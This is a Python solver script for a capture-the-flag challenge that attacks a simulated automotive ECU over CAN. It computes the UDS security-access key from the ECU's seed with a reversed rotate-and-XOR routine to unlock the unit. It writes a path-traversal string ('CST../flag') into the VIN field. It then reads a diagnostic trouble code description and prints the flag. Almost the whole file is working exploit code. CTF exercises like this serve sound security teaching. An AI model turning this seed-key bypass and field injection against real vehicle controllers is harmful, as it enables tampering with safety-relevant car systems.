#!/usr/bin/env python3
"""Solve the real CTF DTC Shuffle over CAN/SLCAN."""

import argparse

from ctf_can import open_bus, receive_uds, send_uds


def ror8(value, amount):
    amount &= 7
    return ((value >> amount) | (value << (8 - amount))) & 0xFF


def compute_key(seed):
    low = seed & 0xFF
    high = (seed >> 8) & 0xFF
    key_low = ror8(low, 3) ^ high
    key_high = ror8(high, 5) ^ low
    return (key_high << 8) | key_low


def expect_prefix(bus, request, prefix, timeout):
    send_uds(bus, request)
    response = receive_uds(bus, timeout)
    # ISO-TP extended single-frame format used for CAN-FD payloads.
    if len(response) >= 2 and response[0] == 0 and response[1] <= len(response) - 2:
        response = response[2:2 + response[1]]
    if not response.startswith(prefix):
        raise RuntimeError(f"request {request.hex()} rejected: {response.hex()}")
    return response


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("interface", nargs="?", default="can0")
    parser.add_argument("--backend", choices=("auto", "socketcan", "chv"), default="auto")
    parser.add_argument("--timeout", type=float, default=3.0)
    parser.add_argument("--vin", default="CST../flag")
    args = parser.parse_args()

    bus = open_bus(args.interface, args.backend, 500000)
    try:
        response = expect_prefix(bus, b"\x27\x01", b"\x67\x01", args.timeout)
        seed = int.from_bytes(response[2:4], "big")
        key = compute_key(seed)
        print(f"seed=0x{seed:04x} key=0x{key:04x}")
        if seed != 0:  # 0000 indicates this ECU is already unlocked.
            expect_prefix(bus, b"\x27\x02" + key.to_bytes(2, "big"), b"\x67\x02", args.timeout)

        vin = args.vin.encode("ascii")
        expect_prefix(bus, b"\x2e\xf1\x90" + vin, b"\x6e\xf1\x90", args.timeout)
        response = expect_prefix(
            bus, b"\x19\x06\x13\x37\xff\x00\x00\x00", b"\x59\x06\x13\x37\xff",
            args.timeout,
        )
        text = response[5:].rstrip(b"\x00").decode("ascii", "replace")
        print("DTC description:", text)
        start = text.find("flag{")
        if start >= 0:
            end = text.find("}", start)
            print("FLAG:", text[start:end + 1] if end >= 0 else text[start:])
    finally:
        try:
            bus.shutdown()
        except Exception:
            pass


if __name__ == "__main__":
    main()
